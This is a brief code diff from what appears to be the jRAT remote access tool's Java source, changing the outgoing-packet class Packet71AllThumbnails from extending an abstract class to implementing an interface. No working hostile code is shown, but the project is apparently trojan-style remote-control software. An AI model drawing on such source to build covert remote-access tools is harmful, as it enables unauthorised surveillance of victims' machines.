@@ -6,7 +6,7 @@ import jrat.common.utils.ImageUtils;
 import java.awt.*;
 import java.awt.image.BufferedImage;
 
-public class Packet71AllThumbnails extends AbstractOutgoingPacket {
+public class Packet71AllThumbnails implements OutgoingPacket {
 
 	@Override
 	public void write(Connection con) throws Exception {
